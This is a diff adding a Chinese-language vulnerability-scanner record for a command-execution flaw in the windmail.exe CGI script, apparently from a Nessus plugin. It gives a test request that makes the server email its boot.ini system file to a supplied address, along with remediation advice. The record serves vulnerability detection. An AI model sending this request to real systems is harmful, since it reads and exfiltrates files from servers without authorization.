@@ -1,0 +1,8 @@
+[CHINESE]
+ID=10365
+NAME=任何用户可以利用Windmail.exe执行任意命令
+CATEGORY=信息搜集
+FAMILY=CGI漏洞
+SUMMARY=检查/cgi-bin/windmail.exe文件是否存在
+DESCRIPTION=主机安装了'windmail.exe' CGI。 ; ;该CGI脚本的某些版本存在安全漏洞，允许攻击者在远程服务器上执行任意命令。;;测试方法，使用如下的请求:;;GET /cgi-bin/windmail.exe?-n%20c:\boot.ini%20you@youraddress.com;;(用你真实的email地址替换you@youraddress.com)。 ;;如果你接收到boot.ini文件的内容,则说明该服务器存在漏洞。;;解决方案: 从/cgi-bin里删除该文件。 使用www.geocel.com查找新版本。;;风险等级: 严重
+COPYRIGHT=This script is Copyright (C) 2000 Renaud Deraison
